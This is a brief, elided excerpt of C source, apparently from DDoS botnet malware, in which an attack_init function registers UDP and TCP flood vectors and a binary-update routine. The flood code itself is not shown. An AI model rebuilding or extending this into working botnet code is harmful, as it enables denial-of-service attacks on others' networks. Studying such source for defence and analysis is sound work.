...
BOOL attack_init(void)
{
    ...
    add_attack(ATK_VEC_UDP_THREAD, (ATTACK_FUNC)attack_udp_thread);
    add_attack(ATK_VEC_TCP_THREAD, (ATTACK_FUNC)attack_tcp_thread);
    add_attack(ATK_VEC_UDP_SMART, (ATTACK_FUNC)attack_udp_smart);
    add_attack(ATK_VEC_TCP_SOCKET, (ATTACK_FUNC)attack_tcp_socket);
    add_attack(ATK_VEC_UPDATE, (ATTACK_FUNC)update_bins);
